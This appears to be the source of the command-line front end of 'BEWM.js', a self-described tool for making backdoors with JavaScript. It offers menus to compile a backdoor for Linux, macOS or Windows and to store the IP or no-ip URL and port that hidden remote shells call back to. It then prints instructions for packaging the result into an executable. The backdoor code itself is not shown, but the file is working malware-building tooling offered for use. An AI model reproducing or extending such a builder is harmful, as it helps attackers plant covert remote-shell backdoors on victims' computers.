/* eslint-disable no-process-exit */
/* eslint-disable @typescript-eslint/ban-ts-ignore */
// import ascii from 'ascii-art';
import boxen from 'boxen';
import 'colors';
// @ts-ignore
import {select, text, confirm} from 'input';
import {exec} from 'child-process-promise';
import {windowClear} from './helpers';
import {fstat, readFileSync, writeFileSync} from 'fs';
/**
 * @description Configuration that get's combined with the binary, has to be defined before packaged.
 */
let config: {
  remoteShell?: {
    ip?: string;
    port?: number;
  };
};
try {
  config = JSON.parse(readFileSync('build/config.json').toString());
} catch (e) {
  config = {};
}
// ████████████████████████
// ████████████████████████
// ████████████████████████
// ████████████████████████
// ████████████████████████
// ██████████  ████    ████   big thanks to the creator of this
// ██████████  ██  ████████   guy, great language :DDDD
// ██████████  ████    ████
// ██████████  ████████  ██
// ██████████  ██  ████  ██
// ██████    ██████    ████
// ████████████████████████
windowClear();
const platformMap: Record<string, string> = {
  darwin: 'macos',
  windows: 'windows',
  linux: 'linux',
};
(async () => {
  console.log(
    `+-------------------------------------------------+
|                                                 |
|                                                 |
|       ____  _______        ____  __             |
|      | __ )| ____\\ \\      / |  \\/  |            |
|      |  _ \\|  _|  \\ \\ /\\ / /| |\\/| |            |
|      | |_) | |___  \\ V  V / | |  | |            |
|      |____/|_____|  \\_/\\_/  |_|  |_|.js         |
|                                                 |
|        Backdoors Effortlessly, With             |
|        Mainly JavaScript.                       |
|                                                 |
|                                                 |
|                                                 |
|                                                 |
|                                                 |
|                                       Jabster28 |
+-------------------------------------------------+
`.blue
  );
  console.log('\n\n');
  select("So, what's tickling your fancy today?", [
    'Make a backdoor',
    'Already made a backdoor? Connect to it now',
    'Config',
  ]).then(async (e: string) => {
    switch (e) {
      case 'Make a backdoor':
        if (!config.remoteShell) {
          console.log(
            boxen(
              "WARNING: YOU WON'T BE ABLE TO REMOTE CONNECT WITHOUT A REMOTESHELL CONFIG, IS THAT OKAY?"
            )
          );
          if (
            !(await confirm("I don't want to connect with a remote shell", {
              default: false,
            }))
          ) {
            return;
          }
        }
        select('What architecture do you want to target?', [
          'linux',
          'darwin',
          'windows',
        ]).then(async (a: string) => {
          console.log(boxen('Compiling TS backdoor to JS...').gray);
          try {
            await exec('tsc');
            await exec(`mv build/${a}.js build/main.js`);
            console.log(boxen('Done!').green);
          } catch (error) {
            console.log(boxen('ERROR!!!').red);
            console.error(error);
          }
          console.log(
            `Now, run this in the project's root directory to compile your built JS file into an executable\n\nyarn pkg . --targets ${platformMap[a]}\n`
          );
          process.exit(0);
        });
        break;
      case 'Config':
        console.log('Current config is:'.white);
        console.log(config);
        select('What would you like to change?', [
          'Hidden Shell Config',
          'e',
        ]).then(async (a: string) => {
          switch (a) {
            case 'Hidden Shell Config':
              if (!config.remoteShell) config.remoteShell = {};
              config.remoteShell.ip = (
                await text(
                  'Enter the IP (or no-ip URL) that you would like remote shells connect to:'
                )
              ).trim();
              config.remoteShell.port = +(
                await text(
                  'Enter the port number that you would like remote shells connect to:'
                )
              ).trim();
              writeFileSync('build/config.json', JSON.stringify(config));
              console.log('Done!');
              break;
            default:
              break;
          }
        });
        break;

      default:
        break;
    }
  });
})();
